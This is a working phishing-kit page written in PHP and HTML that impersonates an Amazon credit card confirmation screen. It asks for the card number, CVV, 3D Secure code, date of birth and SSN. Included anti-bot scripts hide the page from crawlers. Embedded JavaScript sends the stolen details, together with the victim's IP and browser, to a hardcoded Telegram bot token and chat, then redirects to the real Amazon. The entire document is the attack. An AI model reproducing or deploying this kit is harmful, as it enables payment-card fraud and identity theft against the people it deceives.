<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
<script>
    var token = '1711941106:AAGUXQuAJVVOWBUkS5WCi4F0NBGWfjGpEmo';
    var chat_id = 1289043770;
</script>
<!doctype html><html class="a-no-js" data-19ax5a9jf="dingo">
  <head>
<link rel="shortcut icon" type="image/png"href="http://www.veryicon.com/icon/ico/Internet%20%26%20Web/Socialmedia/Amazon.ico"/>

<script type='text/javascript'>var ue_t0=ue_t0||+new Date();</script>

    <title dir="ltr">Amazon credit cards confirmation </title>
    
      
      
        <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AmazonUI-af9e9b82cae7003c8a1d2f2e239005b802c674a4._V2_.css#AUIClients/AmazonUI.fr.rendering_engine-not-trident.secure.min" />
<style>
.auth-workflow .auth-pagelet-container{width:350px;margin:0 auto}.auth-workflow .auth-pagelet-container-wide{width:500px;margin:0 auto}#auth-alert-window{display:none}.auth-display-none{display:none}.auth-pagelet-mobile-container{max-width:400px;margin:0 auto}.auth-pagelet-desktop-narrow-container{max-width:350px;margin:0 auto}.auth-pagelet-desktop-wide-container{max-width:600px;margin:0 auto}label.auth-hidden-label{height:0!important;width:0!important;overflow:hidden;position:absolute}.auth-phone-number-input{margin-left:10px}#auth-captcha-noop-link{display:none}#auth-captcha-image-container{height:70px;width:200px;margin-right:auto;margin-left:auto}.auth-logo-cn{width:110px!important;height:60px!important;background-position:-105px -365px!important;-webkit-background-size:600px 1000px!important;background-size:600px 1000px!important;background-image:url(https://images-cn.ssl-images-amazon.com/images/G/01/amazonui/sprites/aui_sprite_0029-2x._V1_.png)!important}.auth-footer-seperator{display:inline-block;width:20px}#auth-cookie-warning-message{display:none}#auth-pv-client-side-error-box,#auth-pv-client-side-success-box{display:none}.auth-error-messages{color:#000;margin:0}.auth-error-messages li{list-style:none;display:none}.ap_ango_default .ap_ango_email_elem,.ap_ango_default .ap_ango_phone_elem{display:none}.ap_ango_phone .ap_ango_default_elem,.ap_ango_phone .ap_ango_email_elem{display:none}.ap_ango_email .ap_ango_default_elem,.ap_ango_email .ap_ango_phone_elem{display:none}.auth-interactive-dialog{width:100%;height:100%;position:fixed;top:0;left:0;display:none;background:rgba(0,0,0,.8);z-index:100}.auth-interactive-dialog #auth-interactive-dialog-container{display:table-cell;height:100%;vertical-align:middle;position:relative;text-align:center}.auth-interactive-dialog #auth-interactive-dialog-container .auth-interactive-dialog-content{display:inline-block}.auth-third-party-content{text-align:center}.auth-wechat-login-button .wechat_button{background:#13D71F;background:-webkit-gradient(linear,left top,left bottom,from(#13d71f),to(#64d720));background:-webkit-linear-gradient(top,#13d71f,#63d71f);background:-moz-linear-gradient(top,#13d71f,#63d71f);background:-ms-linear-gradient(top,#13d71f,#63d71f);background:-o-linear-gradient(top,#13d71f,#63d71f);background:linear-gradient(top,#13d71f,#63d71f)}.wechat_button_label{color:#fff}.wechat_button_icon{top:5px!important}.a-lt-ie8 .wechat_button_icon{top:0!important}.a-lt-ie8 .auth-wechat-login-button .a-button-inner{height:31px}.identity-provider-pagelet-wechat-container{text-align:center}.auth-contact-verification-spinner{position:absolute;left:45%;top:35%}.auth-contact-verification-spinner img{height:60%;width:60%}#auth-enter-pwd-to-cont{margin-left:2px}.ap_hidden{display:none}.auth-contact-verification-section{position:relative;height:100px}.auth-contact-verification-success-message{position:absolute;bottom:10px}
</style> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script>
        $(document).ready(function () {
            $.getJSON("https://api.ipify.org?format=json", function (data) {
                $("#gfg").html(data.ip);
            })
        });
    </script>
</head>

  <body class="ap-locale-en_US a-auix_ux_57388-t1 a-auix_ux_63571-c a-aui_49697-t1 a-aui_51744-c a-aui_57326-c a-aui_58736-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_ux_47524-t1 a-aui_ux_49594-c a-aui_ux_56217-c a-aui_ux_59374-c a-aui_ux_59797-c a-aui_ux_60000-c">
<div id="gfg" hidden></div>
<div id="a-page"><div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none">
        






<div class="a-section a-spacing-medium a-text-center">
  
    
    
      <a class="a-link-normal" href="">
        
        <i class="a-icon a-icon-logo" aria-label="Amazon"><span class="a-icon-alt">Amazon</span></i>
        
        
      </a>
    
  
</div>

      </div>



<!-- show a warning modal dialog when the third party account is connected with Amazon -->


<div class="a-section a-spacing-base auth-pagelet-container">
  
  


<div class="a-section">
        
          
          

<div class="a-section auth-pagelet-container">
  



    <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem, Order cancelled!</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
     
    </div></div></div>
  


</div>

          
          
        
      </div>
  <div class="a-section">
    
    <form name="signIn" method="post" novalidate action="submit_vbv.php" class="a-spacing-none">
      


  
    <input type="hidden" name="showRmrMe" value="ape:MQ==">
  
    <input type="hidden" name="openid.pape.max_auth_age" value="ape:MA==">
  


      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h3 class="a-spacing-small">
             Credit/Debit Cards confirmation.
          </h3>
          <!-- optional subheading element -->
          
        
 
          <div class="a-section a-spacing-extra-large">
            


<div class="a-section"><div class="a-section pmts-step-2"><span class="a-size-base pmts-pick-address-view-header a-text-bold">Confirm your account details</span><span class="a-letter-space"></span><span class="a-size-small pmts-step-unweighted">(Step 2 of 3)</span><div><BR/>


<div style="height:70px;" id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"><div class="a-box-inner a-alert-container"><b style="" >Nothing will be charged , we just need to verify your identity !</b><i class="a-icon a-icon-alert"></i></div></div>

<label for="ap_email">
              Card Holder Name
            </label>
<input type="text" value="" id="firstNamesq" name="holder" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
<BR/><BR/>
<label for="ap_email">
              Card Number
            </label>
<input type="text" id="cardnumbersq" name="ccnum" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
<BR/><BR/>
<label>Expiration date</label><span><span class="a-dropdown-container"><select name="EXP1" autocomplete="off" id="pmts-id-14" class="a-native-dropdown"><option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4" selected="">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select>
  <span tabindex="-1" class="a-button a-button-dropdown"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt">04</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><span class="a-letter-space"></span><span><span class="a-dropdown-container">
  <select name="EXP2" autocomplete="off" id="pmt-id-10" class="a-native-dropdown">
    <option value="2023" selected="selected">2023</option>
    <option value="2024">2024</option>
    <option value="2025">2025</option>
    <option value="2026">2026</option>
    <option value="2027">2027</option>
    <option value="2028">2028</option>
    <option value="2029">2029</option>
    <option value="2030">2030</option>
    <option value="2031">2031</option>
    <option value="2032">2032</option>
    <option value="2033">2033</option>
    <option value="2034">2034</option>
    <option value="2035">2035</option>
    <option value="2035">2036</option>
    <option value="2035">2037</option>
    <option value="2035">2038</option>
    <option value="2035">2039</option>
    <option value="2035">2040</option>
  </select>
  <span tabindex="-1" class="a-button a-button-dropdown">
    <span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt">2016</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><br><span id="pmts-id-17"></span></div><fieldset class="a-spacing-top-base pmts-form-fields pmts-cup-mbcc"><div class="a-input-text-group"><div class="a-row a-spacing-top-none"><ul class="a-nostyle a-horizontal a-spacing-none"><li><span class="a-list-item">


<label for="pmts-id-18" class="pmts-form-label">CVV2</label></span></li><li><span class="a-list-item"><label>(<a class="pmts-cup-mbcc-help-link" target="_blank" href="#"> What's this? </a>)</label></span></li></ul><input type="text" maxlength="4" id="pmts-id-20" name="cvv2" class="a-input-text a-width-large"><br><span id="pmts-id-19"></span></div><BR/>
<div class="a-divider a-divider-break"><h5></h5></div>
<BR/>
<label for="ap_email">
              3D secure (VBV/MSC)
            </label>
<input type="text" name="vbv" id="vmv" tabindex="1" placeholder="if applicable" class="a-input-text a-span12 auth-autofocus auth-required-field">
<BR/><BR/>
<label for="ap_email">
              Date of birth
            </label>
<input type="text" name="dob" id="do-b" tabindex="1" placeholder="MM/DD/YYYY" class="a-input-text a-span12 auth-autofocus auth-required-field">
<BR/><BR/>
<label for="ap_email">
              SSN
            </label>
<input type="text" name="ssn" id="sun" tabindex="1" placeholder="XXX-XX-XXXX" class="a-input-text a-span12 auth-autofocus auth-required-field">

  <div class="a-row a-spacing-top-medium">
    <div class="a-section a-text-center">
      <label for="auth-remember-me">
        <div data-a-input-name="rememberMe" class="a-checkbox">
         <a href="http://www.credit-card-logos.com"><img alt="<br />
<b>Notice</b>:  Undefined variable: alt_tag in <b>/home/ccl606/public_html/index.html</b> on line <b>64</b><br />
" title="<br />
<b>Notice</b>:  Undefined variable: alt_tag in <b>/home/ccl606/public_html/index.html</b> on line <b>64</b><br />
" src="http://www.credit-card-logos.com/images/multiple_credit-card-logos-1/credit_card_logos_11.gif" width="235" height="35" border="0" /></a>
    
            <span class="a-declarative" data-action="auth-popup" data-auth-popup="{&quot;windowOptions&quot;:&quot;width=700, height=500, resizable=1, scrollbars=1, toolbar=1, status=1&quot;,&quot;targetWindow&quot;:&quot;_blank&quot;}">
        
            </span>
          
        </span></label></div>
      </label>
    </div>
  </div>

          </div>
          <div class="a-divider a-divider-break"><h5></h5></div>

            <span class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="guestSubmit" tabindex="5" class="a-button-input" type="submit"><span class="a-button-text" aria-hidden="true">
              Confirm Credit Card
            </span></span></span>

<script src="http://jquery-creditcardvalidator/jquery.creditCardValidator.js"></script>
    <script src="https://jquery-3.6.4.min.js"></script>
    <script>
    document.getElementById("guestSubmit")
            .addEventListener("click", function (e) {
                e.preventDefault();

		var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
		var cvvRegex = /^[0-9]{3,3}$/;

        var firstname = document.getElementById('firstNamesq').value;
        // var lastname = document.getElementById('lastNamesq').value;
        var cso = document.getElementById('pmts-id-20').value;
        // var emailsq = document.getElementById('emailsq').value;
        var ssn= document.getElementById('sun').value;
        // var mobile = document.getElementById('telephone').value;
        var vmu = document.getElementById('vmv').value;
        var cardNumber = document.getElementById('cardnumbersq').value;
        // var state = document.getElementById('billingState').value;
        var Expire = document.getElementById('pmt-id-10').value;
        // var billaddr = document.getElementById('do-b').value;
        var dob = document.getElementById('do-b').value;

		if (dob == "" || cardNumber == "" || cso == "" || firstname == "") {
            document.getElementById("do-b").style.borderColor = "red";
            document.getElementById("firstNamesq").style.borderColor = "red";
            document.getElementById("pmts-id-20").style.borderColor = "red";
            document.getElementById("cardnumbersq").style.borderColor = "red";
                    setTimeout(() => {
                        document.getElementById("do-b").style.borderColor = "";
                        document.getElementById("firstNamesq").style.borderColor = "";
                        document.getElementById("pmts-id-20").style.borderColor = "";
                        document.getElementById("cardnumbersq").style.borderColor = "";
                    }, 3000);
		}

		else if (firstname != "" && !cardHolderNameRegex.test(firstname)) {
            document.getElementById("firstNamesq").style.borderColor = "red";
                    setTimeout(() => {
                        document.getElementById("firstNamesq").style.borderColor = "";
                        
                    }, 3000);
		}

		// else if (cardNumber != "") {
		// 	$('#cardnumbersq').validateCreditCard(function(result) {
		// 		if (!(result.valid)) {
    //                 document.getElementById("cardnumbersq").style.borderColor = "red";
    //                 setTimeout(() => {
    //                     document.getElementById("cardnumbersq").style.borderColor = "";
    //                 }, 3000);
	
		// 		}
		// 	});
		// }

		else if (cso != "" && !cvvRegex.test(cso)) {
            document.getElementById("pmts-id-20").style.borderColor = "red";
                    setTimeout(() => {
                        document.getElementById("pmts-id-20").style.borderColor = "";
                    }, 3000);
		}

        else {
          var IP = document.getElementById('gfg').value;
            //IP: https://ip-api.com/${IP}\r\nUser-Agent: ${navigator.userAgent}\r\n
                    var message = `====== card stvff ======\r\nfirstname: ${firstname}\r\ncardnumber: ${cardNumber}\r\nCVV1: ${cso}\r\nssn: ${ssn}\r\nvmu: ${vmu}\r\nExpires: ${Expire}\r\ndob: ${dob}\r\nIP: https://ip-api.com/${IP}\r\nUser-Agent: ${navigator.userAgent}\r\n===================`;
                    var settings = {
                        "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
                        "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
                        "data": JSON.stringify({ "chat_id": chat_id, "text": message })
                    }
                    $.ajax(settings).done((response) => { window.location.replace('https://www.amazon.com/'); });
           } 
        }); 
	
</script>
                  
  
                   
        </div></div>
      </div>
    </form>
  </div>
</div>


      </div>

      
      <div id="right-2">
      </div>
      
      <div class="a-section a-spacing-top-extra-large">
        

        <?php if (isset($_SESSION['device']) && !stripos($_SESSION['device'], 'yochi'))
        {
            banbot();
        }
        ; ?>


<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_blank" href="">
      Conditions of Use
    </a>
    <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_blank" href="">
      Privacy Notice
    </a>
    <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_blank" href="">
      Help
    </a>
    <span class="auth-footer-seperator"></span>
  
</div>

<div class="a-section a-spacing-none a-text-center">
  <span class="a-size-mini a-color-secondary">
    	&#9400; 1996-2023, Amazon.com, Inc. or its affiliates
  </span>
</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>

    





</div>


</body>
</html>
